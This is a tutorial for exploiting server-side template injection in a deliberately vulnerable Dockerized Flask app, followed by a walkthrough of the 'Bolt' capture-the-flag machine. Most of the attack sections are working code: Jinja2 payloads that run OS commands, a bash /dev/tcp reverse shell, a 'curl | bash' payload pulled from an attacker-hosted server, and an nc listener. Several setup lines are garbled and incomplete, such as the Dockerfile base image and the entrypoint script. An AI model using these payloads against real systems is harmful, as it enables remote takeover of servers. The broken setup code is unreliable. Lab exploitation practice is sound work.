# Comprehensive Guide to Exploiting Server-Side Template Injection (SSTI) Vulnerability in Dockerized Flask Application

This tutorial will walk you through setting up a vulnerable Flask application in a Docker container, testing for Server-Side Template Injection (SSTI) vulnerabilities, and exploiting it to gain a reverse shell.

## Step-by-Step Guide

### 1. **Environment Setup**

Ensure your environment is set up with the necessary tools.

  
sudo apt update
sudo apt install python3 python3-pip docker.io -y

### 2. **Deploy a Vulnerable Service**

We'll use a simple Flask application with a Jinja2 SSTI vulnerability for this example.

#### Create a Dockerfile

First, create a directory for your project and navigate to it:

  
mkdir ssti-demo
cd ssti-demo

Create a `Dockerfile` with the following content:

 Dockerfile
FROM  :3.8-slim

WORKDIR /app

COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt

COPY . .

RUN chmod +x entrypoint.sh
ENTRYPOINT ["./entrypoint. "]

#### Create a requirements.txt

Create a `requirements.txt` file with the following content:

 text
Flask==2.0.2

#### Create the Flask Application

Create an `app.py` file with the following content:

  
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        name = request.form['name']
        template = f"Hello {name}!"
        return render_template_string(template)
    return '''
        <form method="post">
            Name: <input type="text" name="name">
            <input type="submit">
        </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

#### Create an Entry Point Script

Create a file named `entrypoint.sh` with the following content:

  
#!/bin/ 

# Start the Flask application
  app.py

# Keep the container running
tail -f /dev/null

Make sure the script is executable:

  
chmod +x entrypoint. 

### 3. **Build and Run the Docker Container**

Build the Docker image and run the container, ensuring it keeps running:

  
docker build -t ssti-demo . && docker run -d -p 5000:5000 ssti-demo

### 4. **Manual Scan for SSTI**

Manually inject payloads to test for SSTI vulnerabilities.

#### Testing for SSTI

- Open your web browser and navigate to `http://localhost:5000`.
- Enter `{{7*7}}` in the input field and submit the form.
- If the application returns `49`, it indicates SSTI vulnerability.

### 5. **Exploit SSTI**

#### Example: Executing OS Command

To execute the `id` command, inject the following payload into the input field and submit the form:

  
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

### 6. **Gain Reverse Shell**

First, create a shell script to open a reverse shell.

#### Create Shell Script and Host with HTTP Server

  
echo 'bash -i >& /dev/tcp/your_ip/your_port 0>&1' > shell.sh
python3 -m http.server 8000

Replace `your_ip` with your local IP address and `your_port` with the port you want to listen on.

#### Inject Reverse Shell Payload

Inject the following payload into the input field and submit the form:

  
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://your_ip:8000/shell.sh | bash').read() }}

### 7. **Set Up Listener**

Set up a listener on your local machine to catch the reverse shell.

  
nc -lvnp your_port

Replace `your_port` with the same port used in the shell script.

### Example from Writeups: (Bolt Machine)

#### Step-by-Step Commands

1. **Nmap Scan**

     
   ports=$(nmap -p- --min-rate=1000 -T4 10.129.142.60 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
   nmap -p$ports -sV -sC 10.129.142.60

2. **Add to Hosts File**

     
   echo '10.129.142.60 passbolt.bolt.htb bolt.htb' | sudo tee -a /etc/hosts

3. **Fuzz for Virtual Hosts**

     
   ffuf -u http://10.129.142.60 -H 'Host: FUZZ.bolt.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

4. **Load Docker Image**

     
   docker load < image.tar
   docker run -it flask-dashboard-adminlte_appseed-app sh

5. **Inspect Docker Layers**

     
   wget https://github.com/wagoodman/dive/releases/download/v0.9.2/dive_0.9.2_linux_amd64.deb
   sudo apt install ./dive_0.9.2_linux_amd64.deb
   dive docker-archive://image.tar

6. **Extract Deleted Files**

     
   cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
   tar -xf layer.tar

7. **Crack Ha **

     
   hashcat -m 500 -a 0 hash /usr/share/wordlists/rockyou.txt

8. **Inject SSTI Payload**

     
   {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

9. **Setup Reverse Shell Script**

     
   echo 'bash -i >& /dev/tcp/your_ip/your_port 0>&1' > index.html
   sudo python3 -m http.server 8000

10. **Inject Reverse Shell Payload**

      
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl http://your_ip:8000/index.html | bash').read() }}

11. **Set Up Listener**

      
    nc -lvnp your_port

Replace `your_ip` and `your_port` with the appropriate values.

By following these steps with the provided commands, you should be able to deploy a vulnerable service, manually identify and exploit SSTI vulnerabilities, and gain a reverse shell on the target machine. Always ensure you have permission to test the systems you are working on.
